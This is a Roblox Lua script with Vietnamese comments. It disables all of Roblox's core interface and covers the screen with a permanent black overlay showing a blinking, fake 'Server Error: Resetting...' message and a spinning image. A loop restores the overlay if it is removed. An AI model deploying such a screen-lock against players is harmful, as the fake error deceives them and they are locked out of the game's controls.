local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")

-- Tắt toàn bộ CoreGui của Roblox (nút chat, leaderboard,...)
pcall(function()
	for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
		StarterGui:SetCoreGuiEnabled(guiType, false)
	end
end)

-- GUI loading toàn màn hình
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PermanentResetScreen"
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 999999
screenGui.ResetOnSpawn = false
screenGui.Parent = game:GetService("CoreGui")

-- Nền đen full màn
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.BorderSizePixel = 0
bg.Parent = screenGui

-- Text nhấp nháy
local text = Instance.new("TextLabel")
text.Size = UDim2.new(1, 0, 0, 50)
text.Position = UDim2.new(0, 0, 0.4, 0)
text.BackgroundTransparency = 1
text.Text = "Server Error: Resetting..."
text.TextColor3 = Color3.new(1, 0, 0)
text.TextStrokeColor3 = Color3.new(0, 0, 0)
text.TextStrokeTransparency = 0
text.Font = Enum.Font.GothamBlack
text.TextSize = 40
text.Parent = bg

-- Hình spinner
local spinner = Instance.new("ImageLabel")
spinner.Size = UDim2.new(0, 100, 0, 100)
spinner.Position = UDim2.new(0.5, -50, 0.55, 0)
spinner.BackgroundTransparency = 1
spinner.Image = "rbxassetid://11372950109" -- có thể thay bằng hình khác
spinner.Parent = bg

-- Xoay spinner vĩnh viễn
RunService.RenderStepped:Connect(function()
	spinner.Rotation += 5
end)

-- Nhấp nháy chữ vĩnh viễn
task.spawn(function()
	while true do
		text.Visible = not text.Visible
		task.wait(0.5)
	end
end)

-- Chống bị xóa (tự phục hồi nếu GUI bị phá)
task.spawn(function()
	while true do
		task.wait(1)
		if not screenGui or not screenGui.Parent then
			screenGui.Parent = game:GetService("CoreGui")
		end
	end
end)
_G.loadingFinished = true
